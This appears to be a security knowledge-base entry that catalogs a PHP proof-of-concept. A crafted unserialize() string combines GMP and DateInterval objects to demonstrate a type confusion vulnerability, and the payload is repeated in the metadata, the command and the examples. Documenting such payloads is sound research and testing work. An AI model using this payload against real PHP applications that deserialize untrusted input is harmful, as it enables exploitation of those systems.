---
id: cmd-gmp-cast-001
data: >-
  <?php
  var_dump(unserialize('a:2:{i:0;C:3:"GMP":17:{s:4:"1234";a:0:{}}i:1;O:12:"DateInterval":1:{s:1:"y";R:2;}}'));
  ?>
tags:
  - deserialization
  - type-confusion
  - demo
type: command
output: null
executor: php
platforms:
  - PHP
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.821Z'
verified: false
validated: true
submitted: true
---
# gmp-to-integer-cast-demo

## Command

```php
<?php var_dump(unserialize('a:2:{i:0;C:3:"GMP":17:{s:4:"1234";a:0:{}}i:1;O:12:"DateInterval":1:{s:1:"y";R:2;}}')); ?>
```

## Description

Demonstrates GMP object casting to integer ZVAL using DateInterval __wakeup during unserialization, proving type confusion vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `unserialize(...)` | Serialized array with GMP and DateInterval | Yes |

## Examples

### Basic Usage

```php
<?php var_dump(unserialize('a:2:{i:0;C:3:"GMP":17:{s:4:"1234";a:0:{}}i:1;O:12:"DateInterval":1:{s:1:"y";R:2;}}')); ?>
```

### Advanced Usage

Save as demo.php and run `php demo.php`.

## Expected Output

Dumps unserialized value as integer (e.g., int(5)), showing GMP to long conversion.

## Related

- [[commands/arbitrary-property-update-exploit]]
- [[procedures/Analyze-PHP-GMP-Unserialize-for-Type-Confusion]]
